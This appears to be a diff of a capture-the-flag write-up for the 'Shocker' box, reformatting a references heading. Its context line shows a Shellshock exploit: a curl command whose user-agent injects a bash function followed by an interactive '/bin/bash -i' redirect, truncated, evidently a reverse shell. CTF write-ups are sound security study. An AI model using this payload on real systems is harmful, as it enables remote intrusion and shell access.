@@ -55,7 +55,8 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 + Get root.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c4f85588-6979-435d-b7ef-466ca66b7e4d)
 
-# References & Alternatives:
+
+# References & Alternatives
 + https://vvmlist.github.io/#shock
 + https://0xdf.gitlab.io/2021/05/25/htb-shocker.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/shocker-writeup-w-o-metasploit
